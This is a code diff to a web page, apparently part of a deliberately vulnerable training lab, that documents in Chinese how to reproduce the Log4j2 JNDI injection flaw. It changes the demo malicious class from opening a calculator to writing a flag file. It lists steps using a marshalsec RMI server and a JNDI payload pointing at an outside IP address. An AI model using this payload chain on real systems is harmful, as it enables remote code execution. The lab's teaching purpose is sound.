@@ -46,28 +46,35 @@
                                     @click="fetchDataAndFillTable1">去测试</el-button>
                             </div></el-row>
                         <pre v-highlightjs><code class="java">// 漏洞复现步骤
-1、构造静态恶意类，并编译成 evilcalc.class 文件
+1、构造静态恶意类，并编译成 evil.class 文件
     import java.lang.Runtime;
     import java.lang.Process;
+    import java.io.IOException;
+    import java.io.FileWriter;
 
-    public class evilcalc {
-        public evilcalc (){
+    public class evil {
+        public evil (){
             try{
-                // Runtime.getRuntime().exec("calc.exe"); // Windows
-                // Runtime.getRuntime().exec("open -a Calculator"); // macOS
-                Runtime.getRuntime().exec("open -a Calculator"); // macOS
+                // Runtime.getRuntime().exec("calc.exe"); // Windows本地源码部署
+                // Runtime.getRuntime().exec("open -a Calculator"); // macOS本地源码部署
+                String content = "This is a test flag";
+                String filePath = "/app/flag.txt";
+                
+                FileWriter writer = new FileWriter(filePath);
+                writer.write(content);
+                writer.close();
             }catch (Exception e){
                 e.printStackTrace();
             }
         }
         public static void main(String[] argv){
-            evilcalc e = new evilcalc();
+            evil e = new evil();
         }
     }
 
 2、将 evilcalc.class 放到任意http服务器上(如：python3 -m http.server 8088)
-3、部署rmi/ldap服务，关联静态恶意类（如：java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://xx.xx.xx.xx:8088/#evilcalc" 9999）
-4、发送payload请求到Log4j2漏洞接口：${jndi:rmi://150.109.15.229:9999/evilcalc}
+3、部署rmi/ldap服务，关联静态恶意类（如：java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://xx.xx.xx.xx:8088/#evil" 9999）
+4、发送payload请求到Log4j2漏洞接口：${jndi:rmi://150.109.15.229:9999/evil}
 
 注意：需要在项目中配置启用 RMI 协议支持从远程服务器加载 Java 对象：System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
 
@@ -160,7 +167,7 @@ export default {
     data() {
         return {
             activeName: 'first',
-            payload1: '${jndi:rmi://150.109.15.229:9999/evilfile}',
+            payload1: '${jndi:rmi://150.109.15.229:9999/evil}',
             payload2: '',
         };
     },
